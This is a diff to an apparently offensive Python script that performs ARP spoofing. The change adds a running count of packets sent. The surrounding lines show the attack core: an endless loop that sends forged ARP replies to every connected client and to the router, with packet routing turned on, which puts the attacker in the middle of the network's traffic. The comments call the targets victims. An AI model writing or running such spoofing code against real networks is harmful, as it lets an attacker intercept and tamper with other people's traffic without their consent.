@@ -196,12 +196,14 @@ allow_package_routing(opsys)
 # Spoof all devices (using list of connected devices)
 print("\n[+] Spoof all connected clients:")
 
+sent_packets_count = 0
 while True:
     for client in clients_list:
         # send spoof packets continuously to router and victim
         router = {"mac": router_mac,"ip": router_ip}
         spoof(client,router)
         spoof(router,client)
-        print("[+] Sent two spoof packets: " + client["ip"] + " & " + router_ip)
+        sent_packets_count = sent_packets_count + 2
+        print("[+] Sent 2 spoof packets (" + str(sent_packets_count) + " total): " + client["ip"] + " & " + router_ip)
     time.sleep(2)
 
